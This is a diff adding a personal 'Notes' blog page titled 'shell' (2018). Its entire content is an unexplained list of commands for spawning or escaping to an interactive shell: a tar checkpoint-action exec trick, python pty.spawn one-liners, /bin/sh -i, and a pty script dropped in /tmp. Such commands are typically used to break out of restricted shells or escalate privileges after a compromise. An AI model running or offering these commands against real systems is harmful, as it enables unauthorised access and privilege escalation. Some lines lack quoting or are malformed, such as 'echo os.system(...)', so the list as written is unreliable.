@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>shell</title>
+
+        <link rel="stylesheet" href="/css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Notes</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>shell</h1>
+    <div class="blog-post-subheader">
+        December 17, 2018
+    </div>
+    <div class="blog-post-content">
+        <pre>
+export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH
+export SHELL=/bin/bash
+
+tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash  
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c import pty; pty.spawn("/bin/bash")
+python3 -c import pty; pty.spawn('/bin/bash')
+
+echo os.system('/bin/bash')
+/bin/sh -i
+
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
+</pre>
+
+    </div>
+</section>
+
+    </body>
+</html>
